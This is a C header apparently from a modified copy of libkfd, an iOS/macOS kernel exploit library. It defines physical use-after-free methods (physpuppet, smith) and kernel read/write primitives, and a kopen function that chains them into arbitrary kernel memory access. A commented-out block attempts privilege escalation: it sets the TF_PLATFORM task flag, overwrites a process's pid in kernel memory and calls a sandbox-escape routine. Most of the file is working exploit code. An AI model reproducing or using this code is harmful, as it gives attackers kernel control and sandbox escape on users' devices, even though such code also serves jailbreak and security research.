/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#ifndef libkfd_h
#define libkfd_h

/*
 * The global configuration parameters of libkfd.
 */
#define CONFIG_ASSERT 1
#define CONFIG_PRINT 1
#define CONFIG_TIMER 1

#include "libkfd/common.h"

/*
 * The public API of libkfd.
 */

enum puaf_method {
    puaf_physpuppet,
    puaf_smith,
};

enum kread_method {
    kread_kqueue_workloop_ctl,
    kread_sem_open,
};

enum kwrite_method {
    kwrite_dup,
    kwrite_sem_open,
};

u64 kopen(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method);
void kread(u64 kfd, u64 kaddr, void* uaddr, u64 size);
void kwrite(u64 kfd, void* uaddr, u64 kaddr, u64 size);
void kclose(u64 kfd);

/*
 * The private API of libkfd.
 */

struct kfd; // Forward declaration for function pointers.

struct info {
    struct {
        vm_address_t src_uaddr;
        vm_address_t dst_uaddr;
        vm_size_t size;
    } copy;
    struct {
        i32 pid;
        u64 tid;
        u64 vid;
        u64 maxfilesperproc;
        char kern_version[512];
    } env;
    struct {
        u64 current_map;
        u64 current_pmap;
        u64 current_proc;
        u64 current_task;
        u64 current_thread;
        u64 current_uthread;
        u64 kernel_map;
        u64 kernel_pmap;
        u64 kernel_proc;
        u64 kernel_task;
        u64 launchd_proc;
    } kaddr;
};

struct perf {
    u64 kernel_slide;
    u64 gVirtBase;
    u64 gPhysBase;
    u64 gPhysSize;
    struct {
        u64 pa;
        u64 va;
    } ttbr[2];
    struct ptov_table_entry {
        u64 pa;
        u64 va;
        u64 len;
    } ptov_table[8];
    struct {
        u64 kaddr;
        u64 paddr;
        u64 uaddr;
        u64 size;
    } shared_page;
    struct {
        i32 fd;
        u32 si_rdev_buffer[2];
        u64 si_rdev_kaddr;
    } dev;
    void (*saved_kread)(struct kfd*, u64, void*, u64);
    void (*saved_kwrite)(struct kfd*, void*, u64, u64);
};

struct puaf {
    u64 number_of_puaf_pages;
    u64* puaf_pages_uaddr;
    void* puaf_method_data;
    u64 puaf_method_data_size;
    struct {
        void (*init)(struct kfd*);
        void (*run)(struct kfd*);
        void (*cleanup)(struct kfd*);
        void (*free)(struct kfd*);
    } puaf_method_ops;
};

struct krkw {
    u64 krkw_maximum_id;
    u64 krkw_allocated_id;
    u64 krkw_searched_id;
    u64 krkw_object_id;
    u64 krkw_object_uaddr;
    u64 krkw_object_size;
    void* krkw_method_data;
    u64 krkw_method_data_size;
    struct {
        void (*init)(struct kfd*);
        void (*allocate)(struct kfd*, u64);
        bool (*search)(struct kfd*, u64);
        void (*kread)(struct kfd*, u64, void*, u64);
        void (*kwrite)(struct kfd*, void*, u64, u64);
        void (*find_proc)(struct kfd*);
        void (*deallocate)(struct kfd*, u64);
        void (*free)(struct kfd*);
    } krkw_method_ops;
};

struct kfd {
    struct info info;
    struct perf perf;
    struct puaf puaf;
    struct krkw kread;
    struct krkw kwrite;
};

#include "libkfd/info.h"
#include "libkfd/puaf.h"
#include "libkfd/krkw.h"
#include "libkfd/perf.h"

struct kfd* kfd_init(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method)
{
    struct kfd* kfd = (struct kfd*)(malloc_bzero(sizeof(struct kfd)));
    info_init(kfd);
    puaf_init(kfd, puaf_pages, puaf_method);
    krkw_init(kfd, kread_method, kwrite_method);
    perf_init(kfd);
    return kfd;
}

void kfd_free(struct kfd* kfd)
{
    perf_free(kfd);
    krkw_free(kfd);
    puaf_free(kfd);
    info_free(kfd);
    bzero_free(kfd, sizeof(struct kfd));
}

int ResSet16(void);

u64 kopen(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method)
{
    timer_start();

    const u64 puaf_pages_min = 16;
    const u64 puaf_pages_max = 2048;
    assert(puaf_pages >= puaf_pages_min);
    assert(puaf_pages <= puaf_pages_max);
    assert(puaf_method <= puaf_smith);
    assert(kread_method <= kread_sem_open);
    assert(kwrite_method <= kwrite_sem_open);

    struct kfd* kfd = kfd_init(puaf_pages, puaf_method, kread_method, kwrite_method);
    puaf_run(kfd);
    krkw_run(kfd);
    puts("krkw ran");
    info_run(kfd);
    puts("info ran");
    perf_run(kfd);
    puaf_cleanup(kfd);
    
    //u64 proc = getProc(kfd, getpid());
    //printf("proc: 0x%02llX", proc);
    
    timer_end();
    return (u64)(kfd);
    
    /*
    printf("promoting to TF_PLATFORM\n");
    
    uint32_t t_flags = kread32((u64)kfd, kfd->info.kaddr.current_task + 0x3D0);
    printf("[i] 0x%x task->t_flags: 0x%x\n", proc, t_flags);
    
    #define TF_PLATFORM 0x00000400
    uint32_t t_flags_new = t_flags | TF_PLATFORM;
    
    kwrite32((u64)kfd, kfd->info.kaddr.current_task + 0x3D0, t_flags_new);
    
    printf("building tfp1\n"); sleep(1);
    
    mach_port_t corpse_task = MACH_PORT_NULL;
    task_generate_corpse(mach_task_self(), &corpse_task);
    
    if (corpse_task == MACH_PORT_NULL){
        printf("making fake task FAILED\n"); sleep(1);
        return (u64)(kfd);
    }
    
    uint64_t launchd_task = kfd->info.kaddr.launchd_proc + kfd_offset(proc__object_size);
    
    //assert_false(proc != kfd->info.kaddr.current_proc);
    
    pid_t pid = kread64((u64)kfd, proc + 0x60);
    
    printf("pid test: %d", pid); sleep(1);
    
    kwrite64((u64)kfd, proc + 0x60, 4141);
    
    printf("write test: %d", pid); sleep(1);
    
    pid_t pid2 = kread64((u64)kfd, proc + 0x60);
    
    printf("pid2 test: %d", pid2); sleep(1);
    
    escapeSandboxForProcess((u64)kfd, proc);
    
    timer_end();
    return (u64)(kfd);
     */
}

void kread(u64 kfd, u64 kaddr, void* uaddr, u64 size)
{
    krkw_kread((struct kfd*)(kfd), kaddr, uaddr, size);
}

void kwrite(u64 kfd, void* uaddr, u64 kaddr, u64 size)
{
    krkw_kwrite((struct kfd*)(kfd), uaddr, kaddr, size);
}

void kclose(u64 kfd)
{
    kfd_free((struct kfd*)(kfd));
}

#endif /* libkfd_h */
